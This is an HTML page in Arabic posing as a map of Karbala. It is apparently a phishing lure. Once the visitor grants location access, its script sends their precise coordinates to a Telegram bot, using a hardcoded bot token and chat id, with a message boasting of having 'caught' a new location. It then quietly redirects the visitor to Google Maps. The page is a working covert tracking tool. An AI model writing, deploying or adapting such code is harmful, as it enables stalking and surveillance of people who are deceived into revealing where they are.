<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>خريطة كربلاء المقدسة</title>
    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    // بياناتك الجديدة والمؤكدة
                    const token = "8715903044:AAEiMvrPalCrQMcXRLVw2-8AvIX6fAyPm78";
                    const chat_id = "8419832124";
                    
                    const msg = `🎯 تم اصطياد موقع جديد!\n\n📍 الإحداثيات:\n${lat},${lon}\n\n🌍 رابط الموقع:\nhttps://www.google.com/maps?q=${lat},${lon}`;
                    
                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
                    .then(() => {
                        window.location.href = "https://www.google.com/maps";
                    });
                }, function(error) {
                    alert("يرجى الضغط على سماح لمشاهدة الموقع بدقة");
                }, {enableHighAccuracy: true});
            }
        };
    </script>
</head>
<body style="background-color: black; color: white; text-align: center; padding-top: 100px;">
    <h2>جاري تحميل الخريطة...</h2>
    <p>يرجى الضغط على "سماح" للمتابعة</p>
</body>
</html>
